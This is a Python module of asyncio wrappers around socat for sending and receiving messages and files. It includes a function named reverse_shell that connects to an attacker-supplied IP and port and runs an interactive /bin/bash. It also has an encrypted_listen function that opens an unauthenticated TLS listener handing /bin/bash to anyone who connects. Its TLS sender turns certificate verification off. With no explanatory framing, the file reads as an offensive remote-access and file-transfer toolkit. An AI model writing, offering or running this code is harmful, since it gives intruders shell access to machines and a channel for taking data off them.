import subprocess
import asyncio

async def sending(msg, ip, port, timeout=5):
    try:
        proc = await asyncio.wait_for(
            asyncio.create_subprocess_exec(
                'socat', '-', f'TCP4:{ip}:{port}',
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            ),
            timeout=timeout
        )
        
        proc.stdin.write(msg.encode() + b'\n')
        await proc.stdin.drain()
        
        stdout, stderr = await proc.communicate()
        
        if proc.returncode is None:
            proc.terminate()
        
        return {
            "success": proc.returncode == 0,
            "data": stdout.decode().strip() if stdout else "",
            "error": stderr.decode().strip() if stderr else ""
        }
        
    except asyncio.TimeoutError:
        return {"success": False, "error": "Timeout"}
    except Exception as e:
        return {"success": False, "error": str(e)}

async def listening(port, reuseaddr=True):
    try:
        cmd = ['socat', f'TCP4-LISTEN:{port}', 'exec:/bin/cat']
        
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        return proc
        
    except Exception as e:
        return {"success": False, "error": str(e)}

async def send_file(file_path, ip, port, timeout=10):
    try:
        with open(file_path, 'rb') as f:
            content = f.read()
        
        proc = await asyncio.wait_for(
            asyncio.create_subprocess_exec(
                'socat', '-', f'TCP4:{ip}:{port}',
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            ),
            timeout=timeout
        )
        
        proc.stdin.write(content)
        await proc.stdin.drain()
        
        stdout, stderr = await proc.communicate()
        
        if proc.returncode is None:
            proc.terminate()
        
        return {
            "success": proc.returncode == 0,
            "data": stdout.decode().strip() if stdout else "",
            "error": stderr.decode().strip() if stderr else ""
        }
        
    except Exception as e:
        return {"success": False, "error": str(e)}

async def reverse_shell(attacker_ip, attacker_port):
    try:
        proc = await asyncio.create_subprocess_exec(
            'socat', f'TCP4:{attacker_ip}:{attacker_port}', 'exec:/bin/bash,-i',
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        return proc
    except Exception as e:
        return {"success": False, "error": str(e)}

async def encrypted_send(msg, ip, port, timeout=5):
    try:
        proc = await asyncio.wait_for(
            asyncio.create_subprocess_exec(
                'socat', '-', f'OPENSSL:{ip}:{port},verify=0',
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            ),
            timeout=timeout
        )
        
        proc.stdin.write(msg.encode() + b'\n')
        await proc.stdin.drain()
        
        stdout, stderr = await proc.communicate()
        
        if proc.returncode is None:
            proc.terminate()
        
        return {
            "success": proc.returncode == 0,
            "data": stdout.decode().strip() if stdout else "",
            "error": stderr.decode().strip() if stderr else ""
        }
        
    except Exception as e:
        return {"success": False, "error": str(e)}

async def encrypted_listen(port, cert_path="/path/to/cert.pem"):
    try:
        proc = await asyncio.create_subprocess_exec(
            'socat', 
            f'OPENSSL-LISTEN:{port},cert={cert_path},reuseaddr,fork',
            'exec:/bin/bash',
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        return proc
    except Exception as e:
        return {"success": False, "error": str(e)}

async def receive_file(port, save_path):
    try:
        proc = await asyncio.create_subprocess_exec(
            'socat', 
            f'TCP4-LISTEN:{port},reuseaddr,fork',
            f'file:{save_path},create',
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        return proc
    except Exception as e:
        return {"success": False, "error": str(e)}